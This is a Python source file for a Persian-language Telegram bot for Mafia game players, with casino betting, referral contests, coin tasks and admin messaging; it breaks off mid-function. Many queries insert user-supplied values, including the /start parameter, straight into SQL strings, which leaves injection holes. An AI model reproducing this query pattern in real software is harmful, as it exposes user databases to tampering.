from telegram import Update, InputFile, Video, ReplyKeyboardRemove, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
import sqlite3
import re
import itertools
import datetime
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
from sowal import conv_handler28
from qeq import conv_handler3

keyboard = [
    [KeyboardButton('🎮 بازی ها')],
    [KeyboardButton('📩 پیام خصوصی'), KeyboardButton('🚣 چالش'),KeyboardButton('🌐 پیام همگانی')],
    [KeyboardButton('🎰 کازینو'), KeyboardButton('🏎 مسابقه'), KeyboardButton('🎲 جایزه روزانه')],
    [KeyboardButton('🪪 پروفایل'), KeyboardButton('🎁 دعوت دوستان'), KeyboardButton('🗂 تسک')],
    [KeyboardButton('👨‍💻 پیام به ادمین'), KeyboardButton('📚 راهنما')]]

# keyboard_daily = [
#     [KeyboardButton('🎲🎲'), KeyboardButton('🎯🎯')],
#     [KeyboardButton('🎳🎳'), KeyboardButton('🏀🏀'), KeyboardButton('⚽️⚽️')],
#     [KeyboardButton('بازگشت❌')]]


keyboard_daily = [
    [KeyboardButton('🎲🎲'), KeyboardButton('🎯🎯')],
    [KeyboardButton('بازگشت❌')]]




# keyboard_cazino = [
#     [KeyboardButton('🎲🎲🎲'), KeyboardButton('🎯🎯🎯')],
#     [KeyboardButton('🎳🎳🎳'), KeyboardButton('🏀🏀🏀'), KeyboardButton('⚽️⚽️⚽️')],
#     [KeyboardButton('بازگشت❌')]]



keyboard_cazino = [
    [KeyboardButton('🎲🎲🎲'), KeyboardButton('🏀🏀🏀'), KeyboardButton('🎯🎯🎯'), KeyboardButton('🎳🎳🎳')],
    [KeyboardButton('بازگشت❌')]]


keyboard_task = [
    [KeyboardButton('✅یک تسک انجام دادم✅')],
    [KeyboardButton('بازگشت❌')]]


CHANNEL_IDS = ["@dohat_nime", "@sahere_rasmi"]

CHANNEL_IDS2 = ["@dohat_nime", "@sahere_rasmi"]

CHANNEL_IDS3 = ["@MhmdsCh"]



conn = sqlite3.connect('users.db', check_same_thread=False)
c = conn.cursor()




c.execute(
    """CREATE TABLE IF NOT EXISTS users(
    id INTEGER PRIMARY KEY,
    user_id INTEGER,
    username VARCHAR(20),
    Khas VARCHAR(15) UNIQUE,
    Lig VARCHAR(1),
    Block VARCHAR,
    Referrals VARCHAR,
    user_id_ref INTEGER,
    avalinpm VARCHAR,
    admin_block INTEGER,
    tas INTEGER,
    Ham INTEGER,
    ann INTEGER,
    coin INTEGER,
    Dart INTEGER,
    Bol INTEGER,
    ONER INTEGER,
    Bas INTEGER,
    admin_block2 INTEGER,
    Foot INTEGER,
    minu INTEGER,
    etc INTEGER,
    like INTEGER,
    oneper INTEGER,
    rozja INTEGER,
    kilike INTEGER,
    onebar INTEGER,
    myuser INTEGER,
    roban INTEGER
    )"""
)


# c.execute("""
#     ALTER TABLE users
#     ADD COLUMN roban INTEGER
# """)


# c.execute("""
#     ALTER TABLE users
#     ADD COLUMN rozja INTEGER
# """)


# c.execute("""
#     ALTER TABLE users
#     ADD COLUMN oneper INTEGER
# """)

# c.execute("""
#     ALTER TABLE users
#     ADD COLUMN like INTEGER
# """)



# c.execute(f"UPDATE users SET etc={0} WHERE user_id=5469541693")
# conn.commit()
# c.execute(f"UPDATE users SET etc={0} WHERE user_id=5571950188")
# conn.commit()



# import sys
# sys.path.append('msgsender')






async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    start_param = context.args[0] if context.args else None
    if start_param:
        all_users_id_ = c.execute('SELECT user_id FROM users').fetchall()
        all_users_id = [int(i[0])for i in all_users_id_]
        if int(user_id) not in all_users_id:
            c.execute(f"UPDATE users SET Referrals=CONCAT(Referrals, ',', {int(user_id)}) WHERE user_id={int(start_param)}")
            conn.commit()
            zza = c.execute(f"SELECT username FROM users WHERE user_id={user_id}")
            zza = c.fetchone()
            # zza = zza[0]
            law = c.execute(f"SELECT Khas FROM users WHERE user_id={start_param}")
            law = c.fetchone()
            law = law[0]
            bbb = c.execute(f"SELECT username FROM users WHERE user_id={start_param}")
            bbb = c.fetchone()
            bbb = bbb[0]
            await context.bot.send_message(chat_id=start_param, text='🎉کاربری با لینک دعوت شما عضو ربات شد\nاگه ثبت نام کرد خبرت میکنم')
            await context.bot.send_message(chat_id="5469541693", text=f'''🎉کاربر جدید

{user_id} 🐦

دعوت شده توسط:

{start_param} 🐗 @{bbb} 🐗 {law}

(هنوز ثبت نام نکرده)''')
        else:
            await context.bot.send_message(chat_id="5469541693", text='قبلا ثبت نام کرده')
        # await context.bot.send_message(chat_id="5469541693", text=f"آیدی عددی دریافت شده از لینک: {start_param}")
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    harf = 'کاربر جدید ایول🐬🐬🐬'
    user_id = update.effective_user.id
    username = update.message.from_user.username
    all_users_id_ = c.execute('SELECT user_id FROM users').fetchall()
    all_users_id = [int(i[0])for i in all_users_id_]
    if int(user_id) not in all_users_id:
        c.execute("INSERT INTO users(user_id, username) VALUES (?,?)", (user_id,username))
        await context.bot.send_message(chat_id="5469541693", text=f'{harf}\n\n@{username}\n\n{user_id}')
        conn.commit()
        if start_param:
            aa = c.execute(f"SELECT user_id_ref FROM users WHERE user_id={user_id}")
            aa = c.fetchone()
            aa = aa[0]
            if aa == None:
                c.execute(f"UPDATE users SET user_id_ref='{int(start_param)}' WHERE user_id={user_id}")
                conn.commit()
                c.execute(f"UPDATE users SET avalinpm='{0}' WHERE user_id={user_id}")
                conn.commit()
        await update.message.reply_text('''درود
این ربات مخصوص مافیا پلیر ها طراحی شده، پس طبیعتا قبل از استفاده از قابلیت های ربات، ربات نیاز داره که بدونه شما با چه اسم و لیگی بازی میکنید(باید ثبت نام کنید)

برای ثبت نام کافیه وارد ربات مافیا @dohat32bot بشید، دکمه پروفایل رو بزنید، و پروفایل مافیاتون رو برای این ربات فوروارد کنید به همین راحتی
اگه متوجه نشدی میتونی آموزش ویدیویی ثبت نام کردن رو ببینی👇
/saptnamgif
اگه بازم متوجه نشدی تو قسمت پیام به ادمین بگو که راهنماییت کنم''')
        # await context.bot.send_message(chat_id=user_id, text="برای استفاده از قابلیت های ربات شما باید در کانال زیر عضو باشید👇\n@dohat_nime")
    await update.message.reply_text(f'سلام {update.effective_user.first_name}\n\nخوش اومدی❤️\n\nراهنمای ربات👇\n\n/help', reply_markup=reply_markup)



async def key_daily(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    reply_markup = ReplyKeyboardMarkup(keyboard_daily, resize_keyboard=True)
    await update.message.reply_text('در این قسمت میتونید هر روز شانستون رو در هر کدوم از گزینه ها امتحان کنید و در صورت برنده شدن سکه به پروفایل شما اضافه میشه', reply_markup=reply_markup)

async def bazii(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text('بزودی...')




async def key_cazino(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if str(user_id) != "5469541693":
        for channel_id in CHANNEL_IDS:
            try:
                # استفاده از getChatMember برای بررسی وضعیت عضویت
                chat_member = await context.bot.get_chat_member(channel_id, user_id)
                # اگر کاربر عضو نباشه
                if chat_member.status in ['left', 'kicked']:
                    # ارسال پیام به کاربر
                    await context.bot.send_message(chat_id=user_id, text="""برای استفاده از قابلیت های ربات شما باید در کانال های زیر عضو باشید👇

@sahere_rasmi - کانال رسمی ساحره(اجباری)
@dohat_nime - کانال غیررسمی ساحره(اجباری)
@MhmdsCh - کانال شخصی من(غیر اجباری)""")
                    return
            except Exception as e:
                # در صورت بروز خطا
                context.bot.send_message(chat_id=user_id, text="مشکلی در بررسی عضویت شما پیش آمده.")
                return
    reply_markup = ReplyKeyboardMarkup(keyboard_cazino, resize_keyboard=True)
    await update.message.reply_text('''🏠شما وارد بخش کازینو شدید
تو این قسمت میتونید شرط بندی کنید
آموزش استفاده از بخش کازینو👇
/cazino''', reply_markup=reply_markup)


async def key_task(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    reply_markup = ReplyKeyboardMarkup(keyboard_task, resize_keyboard=True)
    await update.message.reply_text("""🤑تو این بخش میتونید با انجام کار های ساده سکه دریافت کنید

تسک ها در کانال 👈 @sahere_task قرار داده شده
هر وقت هر کدوم از تسک ها رو انجام دادی برای دریافت سکه دکمه "✅یک تسک انجام دادم✅" رو بزن""", reply_markup=reply_markup)


async def exit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text('🏠صفحه اصلی', reply_markup=reply_markup)


async def sa(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    rr = str(user_id)
    if rr == "5469541693":
        c.execute("SELECT user_id FROM users")
        rows = c.fetchall()
        text1 = update.message.text
        text1 = text1.replace("/sa ", "")
        yyi = list(itertools.chain.from_iterable(map(lambda x: [x[0]], rows)))
        for row in yyi:
            try:
                await context.bot.send_message(chat_id=row, text=text1)
            except:
                pass
        await update.message.reply_text("✅پیام شما برای همه ارسال شد")




async def sa2(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    rr = str(user_id)
    if rr == "5469541693":
        c.execute("SELECT user_id, Khas FROM users")
        rows = c.fetchall()
        text1 = update.message.text
        text1 = text1.replace("/sa2 ", "")
        yyi = [row[0] for row in rows if row[1] is None]
        for row in yyi:
            try:
                await context.bot.send_message(chat_id=row, text=text1)
            except:
                pass
        await update.message.reply_text("✅پیام شما برای همه ارسال شد")



async def seke(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    rr = str(user_id)
    if rr == "5469541693" or rr == "5571950188":
        yy = update.message.text
        await context.bot.send_message(chat_id="5469541693", text=yy)
        yy = yy.replace("/seke ", "")
        c.execute(f"UPDATE users SET etc={yy} WHERE user_id=6967243537")
        conn.commit()
        await update.message.reply_text('جایزه دعوت با موفقیت تغییر کرد')



async def photoa(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    rr = str(user_id)
    if rr == "5469541693":
        c.execute("SELECT user_id FROM users")
        rows = c.fetchall()
        photo = update.message.photo[-1]
        photoo = await context.bot.get_file(photo)
        await photoo.download_to_drive("photo.jpg")
        caption = update.message.caption
        for row in list(itertools.chain.from_iterable(map(lambda x: [x[0]], rows))):
            try:
                with open("photo.jpg", "rb") as f:
                    await context.bot.send_photo(chat_id=row, photo=f, caption=caption)
            except:
                pass
        
        await update.message.reply_text("✅عکس و کپشن برای همه کاربران ارسال شد")
    else:
        await update.message.reply_text('نوب عکس میفرستی که چی بشه')





async def users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    rr = str(user_id)
    if rr == "5469541693":
        c.execute("SELECT user_id FROM users")
        rows = c.fetchall()
        await update.message.reply_text(f"تعداد کاربر هایی که رباتو استارت کردن {len(rows)} است🙇🏿")
        # await update.message.reply_text(f"تعداد کاربرای فعال ربات {len(rows)} است🔢")



async def resetlike(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    rr = str(user_id)
    if rr == "5469541693" or rr == "5571950188":
        # c.execute(f"UPDATE users SET like = NULL")
        # conn.commit()
        # c.execute(f"UPDATE users SET oneper = NULL")
        # conn.commit()
        # c.execute(f"UPDATE users SET kilike = NULL")
        # conn.commit()
        c.execute(f"UPDATE users SET etc={0} WHERE user_id=5469541693")
        conn.commit()
        c.execute(f"UPDATE users SET etc={0} WHERE user_id=5571950188")
        conn.commit()
        await update.message.reply_text('✅ریست شد')



async def resetref(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    rr = str(user_id)
    if rr == "5469541693":
        c.execute(f"UPDATE users SET Referrals = NULL")
        conn.commit()
        c.execute(f"UPDATE users SET ONER = NULL")
        conn.commit()
        await update.message.reply_text('✅ریست شد')


async def nerkh(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    rr = str(user_id)
    # if rr == "5469541693" or rr == "5571950188":
    if rr == "5469541693":
        vv = c.execute(f"SELECT etc FROM users WHERE user_id=5469541693")
        vv = c.fetchone()
        vv = vv[0]
        ww = c.execute(f"SELECT etc FROM users WHERE user_id=5571950188")
        ww = c.fetchone()
        ww = ww[0]
        if ww == None:
            ww = 0
    #     await update.message.reply_text(f"""🏀وضعیت بسکتبال تا الان به این صورته:

    # ✅تعداد برنده ها: {vv}
    # ✅تعداد سکه ای که برنده شدن: {vv * 22.5 - (vv * 10)}

    # ❌تعداد بازنده ها: {ww}
    # ❌تعداد سکه ای که باخته اند: {ww * 10}

    # 💰 سود ما {ww * 10 - (vv * 22.5 - vv * 10)} سکه\n\n⭕️نکته: سکه شرط همه شرط ها رو 10 در نظر گرفتم""")
        await update.message.reply_text(f'''🌮سکه هایی که تا الان خرج دعوت و جایزه روزانه شده: {ww} سکه

🍪سکه هایی که تا الان بورای به کاربرا واریز کرده: {vv} سکه

جمع این دو: {ww + vv} سکه''')


# async def sho(update, context):
#     c.execute("SELECT username FROM users")
#     rows = c.fetchall()
#     await update.message.reply_text(f'{rows}')



async def buray(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    rr = str(user_id)
    if rr == "5469541693" or rr == "5571950188":
        vv = c.execute(f"SELECT etc FROM users WHERE user_id=5469541693")
        vv = c.fetchone()
        vv = vv[0]
        await update.message.reply_text(f'''مقدار واریزی سکه توسط بورای: {vv}

⭕️نکته: این مقدار شامل جایزه روزانه جایزه رفرال واریزی های محمدز نمیشه فقط فقط واریزی های بورای''')



async def sahih(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    rr = str(user_id)
    from sowal import sss
    if rr == "5469541693":
        await update.message.reply_text(sss)





async def off(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    rr = str(user_id)
    if rr == "5469541693" or rr == "5571950188" or rr == "6582674173":
        ff = c.execute("SELECT etc FROM users WHERE user_id = ?", ('6364622155',))
        ff = c.fetchone()
        ff = ff[0]
        if ff == None:
            c.execute(f"UPDATE users SET etc='{1}' WHERE user_id = ?", ('6364622155',))
            conn.commit()
            await context.bot.send_message(chat_id='5469541693', text='🔒قفل شد')
            await context.bot.send_message(chat_id='5571950188', text='🔒قفل شد')
            await context.bot.send_message(chat_id='6582674173', text='🔒قفل شد')
        elif ff == 0:
            c.execute(f"UPDATE users SET etc='{1}' WHERE user_id = ?", ('6364622155',))
            conn.commit()
            await context.bot.send_message(chat_id='5469541693', text='🔒قفل شد')
            await context.bot.send_message(chat_id='5571950188', text='🔒قفل شد')
            await context.bot.send_message(chat_id='6582674173', text='🔒قفل شد')
        elif ff == 1:
            c.execute(f"UPDATE users SET etc='{0}' WHERE user_id = ?", ('6364622155',))
            conn.commit()
            await context.bot.send_message(chat_id='5469541693', text='🔓قفل باز شد')
            await context.bot.send_message(chat_id='5571950188', text='🔓قفل باز شد')
            await context.bot.send_message(chat_id='6582674173', text='🔓قفل باز شد')




async def sho(update, context):
    user_id = update.effective_user.id
    rr = str(user_id)
    if rr == "5469541693":
        c.execute("SELECT username FROM users")
        rows = c.fetchall()
        usernames = [f"@{row[0]}" for row in rows]
        await update.message.reply_text('\n'.join(usernames))


async def show(update, context):
    user_id = update.effective_user.id
    rr = str(user_id)
    c.execute("SELECT Khas, Lig, id FROM users")
    rows = c.fetchall()
    user_info = [f"{row[2]}.{row[1]}{row[0]}" for row in rows if row[0]]

    # Split the user_info list into three parts
    part1 = user_info[:len(user_info)//3]
    part2 = user_info[len(user_info)//3:2*len(user_info)//3]
    part3 = user_info[2*len(user_info)//3:]

    # Send the three parts as separate messages
    await update.message.reply_text('🐜افرادی که تا الان در این ربات ثبت نام کرده اند:\n\n' + '\n'.join(part1))
    await update.message.reply_text('\n'.join(part2))
    await update.message.reply_text('\n'.join(part3))



async def showlist(update, context):
    user_id = update.effective_user.id
    c.execute("SELECT ONER, Khas, Lig, id FROM users")
    rows = c.fetchall()
    
    # Sort the rows based on the 'like' value in descending order, treating None as 0
    rows.sort(key=lambda x: x[0] if x[0] is not None else 0, reverse=True)
    
    user_info = []
    for i, row in enumerate(rows, start=1):
        if row[0] is not None and row[0] > 0:
            if i == 1:
                user_info.append(f"🏆 {row[3]}.{row[2]}{row[1]}  <---> {row[0]} دعوت")
            elif i == 2:
                user_info.append(f"🥈 {row[3]}.{row[2]}{row[1]}  <---> {row[0]} دعوت")
            elif i == 3:
                user_info.append(f"🥉 {row[3]}.{row[2]}{row[1]}  <---> {row[0]} دعوت")
            else:
                user_info.append(f"{row[3]}.{row[2]}{row[1]}  <---> {row[0]} دعوت")

    try:
        await update.message.reply_text("""🏆 404.🚀ارتی  <---> 12 دعوت(350 سکه)

🥈 403.🦀پارسام  <---> 10 دعوت(250 سکه)

🥉 104.♾ممدوو  <---> 5 دعوت(100 سکه)

814.💫جهت  <---> 3 دعوت(100 سکه)

نفرات برتر مسابقه قبل
منتظر مسابقه بعدی باش😉""")
#         await update.message.reply_text('\n\n'.join(user_info))
    except:
        pass
#         await update.message.reply_text('❌تعداد دعوت ها ریست شده است و کسی هنوز دعوتی ندارد')
#     await update.message.reply_text('''🧙 دومین مسابقه ربات ساحره

# 🏆 جایزه نفر اول: 350 سکه
# 🥈 جایزه نفر دوم: 250 سکه
# و بین کسایی که حداقل سه نفرو دعوت کرده باشن قرعه کشی میکنیم و به سه نفرشون 100 سکه میدیم

# تا ساعت 00:00 جمعه 23 شهریور فرصت دعوت کردن دارید
# میتونید نفرات برتر و رتبه خودتون رو در در لیست بالا ببینید👆''')
    




SENDING_MASSEGE2 = 1
async def MS(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # words = update.message.text
    user_id = update.effective_user.id
    qq = c.execute(f"SELECT admin_block2 FROM users WHERE user_id={user_id}")
    qq = c.fetchone()
    qq = qq[0]
    if qq == 1:
        await context.bot.send_message(chat_id=user_id , text='❌شما توسط ادمین بن شدید')
        return ConversationHandler.END
    ll = 'پیامی که میخوای به ادمین ارسال کنی رو بنویس\n\nبرای خروج از دکمه بازگشت استفاده کنید👇'
    reply = ReplyKeyboardMarkup([['❌بازگشت']], resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text=ll, reply_markup=reply)
    return SENDING_MASSEGE2

async def MS2(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    user_id = update.effective_user.id
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    username = update.message.from_user.username
    harf = update.message.text
    ioi = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ioi = c.fetchone()
    ioi = ioi[0]
    pop = c.execute(f"SELECT Lig FROM users WHERE user_id={user_id}")
    pop = c.fetchone()
    pop = pop[0]
    answer1 = f"ii {user_id}"
    button2 = InlineKeyboardButton("پاسخ", callback_data=answer1)
    keyboard2 = InlineKeyboardMarkup([[button2]])
    se = c.execute(f"SELECT myuser FROM users WHERE user_id={user_id}")
    se = c.fetchone()
    se = se[0]
    if se == 1:
        await context.bot.send_message(chat_id="5469541693", text=f'{harf}\n\n@{username}\n\n{user_id}\n\n{pop}{ioi}', reply_markup=keyboard2)
        await context.bot.send_message(chat_id=update.effective_chat.id, text='پیامت برای ادمین ارسال شد✅', reply_markup=reply_markup)
        return ConversationHandler.END
    else:
        await context.bot.send_message(chat_id="5469541693", text=f'{harf}\n\n@{username}\n\n{user_id}\n\n{pop}{ioi}', reply_markup=keyboard2)
        await context.bot.send_message(chat_id="5571950188", text=f'{harf}\n\n@{username}\n\n{user_id}\n\n{pop}{ioi}', reply_markup=keyboard2)
        await context.bot.send_message(chat_id=update.effective_chat.id, text='پیامت برای ادمین ارسال شد✅', reply_markup=reply_markup)
    return ConversationHandler.END
async def MS3(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text='🏠صفحه اصلی', reply_markup=reply_markup)
    return ConversationHandler.END


async def MS3(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text='🏠صفحه اصلی', reply_markup=reply_markup)
    return ConversationHandler.END



conv_handler2 = ConversationHandler(
    entry_points=[MessageHandler(filters.Regex(re.compile(r'^👨‍💻 پیام به ادمین$')), MS)],
    states={
        SENDING_MASSEGE2: [
            MessageHandler(filters.TEXT & ~filters.Regex(r'^❌بازگشت$'), MS2),
            MessageHandler(filters.Regex(r'^❌بازگشت$'), MS3)
        ],
        ConversationHandler.TIMEOUT:[MessageHandler(filters.TEXT, MS3)]
    },
    fallbacks=[],
    conversation_timeout=120
)




TASK = 1
async def task1(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # words = update.message.text
    user_id = update.effective_user.id
    qq = c.execute(f"SELECT admin_block2 FROM users WHERE user_id={user_id}")
    qq = c.fetchone()
    qq = qq[0]
    if qq == 1:
        await context.bot.send_message(chat_id=user_id , text='❌شما توسط ادمین بن شدید')
        return ConversationHandler.END
    ll = '🗂مدرک تسکی که انجام دادی رو به صورت عکس بفرست\n\n میتونی پیام هم ارسال کنی'
    reply = ReplyKeyboardMarkup([['❌بازگشت']], resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text=ll, reply_markup=reply)
    return TASK

async def task2(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard_task
    user_id = update.effective_user.id
    user66 = update.effective_user.first_name
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    username = update.message.from_user.username
    harf = update.message.text
    ioi = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ioi = c.fetchone()
    ioi = ioi[0]
    pop = c.execute(f"SELECT Lig FROM users WHERE user_id={user_id}")
    pop = c.fetchone()
    pop = pop[0]
    answer1 = f"ii {user_id}"
    button2 = InlineKeyboardButton("پاسخ", callback_data=answer1)
    answer3 = f"kk {user_id}"
    button3 = InlineKeyboardButton("💷ارسال سکه💷", callback_data=answer3)
    keyboard2 = InlineKeyboardMarkup([[button2, button3]])
    await context.bot.send_message(chat_id="5469541693", text=f'🗂🗂🗂\n\n{harf}\n\n{user66}\n\n@{username}\n\n{user_id}\n\n{pop}{ioi}', reply_markup=keyboard2)
    await context.bot.send_message(chat_id="5571950188", text=f'🗂🗂🗂\n\n{harf}\n\n{user66}\n\n@{username}\n\n{user_id}\n\n{pop}{ioi}', reply_markup=keyboard2)
    await context.bot.send_message(chat_id=update.effective_chat.id, text='پیامت برای ادمین ارسال شد✅', reply_markup=reply_markup)
    return ConversationHandler.END


async def task3(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard_task
    user_id = update.effective_user.id
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    username = update.message.from_user.username
    user66 = update.effective_user.first_name
    ioi = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ioi = c.fetchone()
    ioi = ioi[0]
    pop = c.execute(f"SELECT Lig FROM users WHERE user_id={user_id}")
    pop = c.fetchone()
    pop = pop[0]
    answer1 = f"ii {user_id}"
    button2 = InlineKeyboardButton("پاسخ", callback_data=answer1)
    answer3 = f"kk {user_id}"
    button3 = InlineKeyboardButton("💷ارسال سکه💷", callback_data=answer3)
    keyboard2 = InlineKeyboardMarkup([[button2, button3]])
    photo = update.message.photo[-1]
    photoo = await context.bot.get_file(photo)
    await photoo.download_to_drive("photo1.jpg")
    # with open('photo1.jpg', 'rb') as f:
    #     context.bot.send_photo(chat_id="5469541693", photo=InputFile(f), caption = f'🗂🗂🗂\n\n{user66}\n\n@{username}\n\n{user_id}\n\n{pop}{ioi}', reply_markup=keyboard2)
    with open("photo1.jpg", "rb") as f:
        await context.bot.send_photo(chat_id="5469541693", photo=f, caption = f'🗂🗂🗂\n\n{user66}\n\n@{username}\n\n{user_id}\n\n{pop}{ioi}', reply_markup=keyboard2)
    with open("photo1.jpg", "rb") as f:
        await context.bot.send_photo(chat_id="5571950188", photo=f, caption = f'🗂🗂🗂\n\n{user66}\n\n@{username}\n\n{user_id}\n\n{pop}{ioi}', reply_markup=keyboard2)
        await context.bot.send_message(chat_id=update.effective_chat.id, text='✅عکس با موفقیت به ادمین ارسال شد\n\nمنتظر تایید باش', reply_markup=reply_markup)
    return ConversationHandler.END


async def taskcans(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    reply_markup = ReplyKeyboardMarkup(keyboard_task, resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text='🏠تسک', reply_markup=reply_markup)
    return ConversationHandler.END




conv_handler25 = ConversationHandler(
    entry_points=[MessageHandler(filters.Regex(re.compile(r'^✅یک تسک انجام دادم✅$')), task1)],
    states={
        TASK: [
            MessageHandler(filters.TEXT & ~filters.Regex(r'^❌بازگشت$'), task2),
            MessageHandler(filters.PHOTO & ~filters.Regex(r'^❌بازگشت$'), task3),
            MessageHandler(filters.Regex(r'^❌بازگشت$'), taskcans)
        ],
        ConversationHandler.TIMEOUT:[MessageHandler(filters.TEXT, taskcans)]
    },
    fallbacks=[],
    conversation_timeout=120
)







WOFH = 1
async def shoro_answer_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # cdehh = context.user_data['cdehh'] 
    # cdehh = cdehh.split()
    # cdehh = cdehh[1]
    query = update.callback_query
    query.answer()
    cdehh = query.data
    context.user_data['cdehh'] = cdehh
    await context.bot.send_message(chat_id=update.effective_chat.id, text='🖋پیام مورد نظر برای پاسخ را بنویسید')
    return WOFH


async def answer_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    cdehh = context.user_data['cdehh'] 
    cdehh = cdehh.split()
    cdehh = cdehh[1]
    user_id = update.effective_user.id
    fff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    fff = c.fetchone()
    fff = fff[0]
    uu = c.execute(f"SELECT Lig FROM users WHERE user_id={user_id}")
    uu = c.fetchone()
    uu = uu[0]
    ioi = c.execute(f"SELECT Khas FROM users WHERE user_id={cdehh}")
    ioi = c.fetchone()
    ioi = ioi[0]
    pop = c.execute(f"SELECT Lig FROM users WHERE user_id={cdehh}")
    pop = c.fetchone()
    pop = pop[0]
    try:
        msg = update.message.text
        matn = f'⭕️شما یک پیام خصوصی از طرف ادمین دارید⭕️\nمتن پیام👇\n\n{msg}\n\n'
        await context.bot.send_message(chat_id=cdehh, text=f"{matn}\n\n{uu}{fff}")
        # await context.bot.send_message(chat_id="5469541693", text=f'پیام بورای به کاربر\n\n{ff}\n\n{matn}')
        await update.message.reply_text('پیام شما با موفقیت ارسال شد ✅')
        if user_id == 5469541693:
            await context.bot.send_message(chat_id="5571950188", text=f'جواب ممدز به کاربر\n\n{cdehh}\n\n{pop}{ioi}\n\n{msg}')
        if user_id == 5571950188:
            await context.bot.send_message(chat_id="5469541693", text=f'جواب بورای به کاربر\n\n{cdehh}\n\n{pop}{ioi}\n\n{msg}')
        return ConversationHandler.END
    except:
        await update.message.reply_text('❌در حال حاضر امکان ارسال پیام به این کاربر وجود ندارد')
        return ConversationHandler.END



async def cananswer(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("صفحه اصلی")
    return ConversationHandler.END



conv_handler10 = ConversationHandler(
    entry_points=[CallbackQueryHandler(shoro_answer_admin, pattern=r'^i')],
    states={
        WOFH: [MessageHandler(filters.TEXT & ~filters.COMMAND , answer_admin)],
        ConversationHandler.TIMEOUT:[MessageHandler(filters.TEXT, cananswer)]
    },
    fallbacks=[CommandHandler('cancel', cananswer)],
    conversation_timeout= 120
)




VAR = 1
async def variz(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # cdehh = context.user_data['cdehh'] 
    # cdehh = cdehh.split()
    # cdehh = cdehh[1]
    query = update.callback_query
    query.answer()
    cdehh = query.data
    context.user_data['cdehh'] = cdehh
    await context.bot.send_message(chat_id=update.effective_chat.id, text='چند سکه؟')
    return VAR


async def variz2(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    cdehh = context.user_data['cdehh'] 
    cdehh = cdehh.split()
    cdehh = cdehh[1]
    user_id = update.effective_user.id
    ioi = c.execute(f"SELECT Khas FROM users WHERE user_id={cdehh}")
    ioi = c.fetchone()
    ioi = ioi[0]
    pop = c.execute(f"SELECT Lig FROM users WHERE user_id={cdehh}")
    pop = c.fetchone()
    pop = pop[0]
    xsx = c.execute(f"SELECT coin FROM users WHERE user_id={cdehh}")
    xsx = c.fetchone()
    xsx = xsx[0]
    if xsx == None:
        xsx = 0
    try:
        adad = update.message.text
        pp = float(xsx) + float(adad)
        c.execute(f"UPDATE users SET coin={pp} WHERE user_id={cdehh}")
        conn.commit()
        user_id = update.effective_user.id
        rr = str(user_id)
        if rr == "6967243537" or rr == "5571950188":
            bu = c.execute(f"SELECT etc FROM users WHERE user_id=5469541693")
            bu = c.fetchone()
            bu = bu[0]
            if bu == None:
                bu = 0
            nr = int(bu) + float(adad)
            c.execute(f"UPDATE users SET etc={nr} WHERE user_id=5469541693")
            conn.commit()
        await context.bot.send_message(chat_id=cdehh, text=f'✅مقدار {adad} سکه از طرف ادمین به پروفایل شما اضافه شد')
        await update.message.reply_text(f'✅ مقدار {adad} سکه با موفقیت به پروفایل {pop}{ioi} اضافه شد')
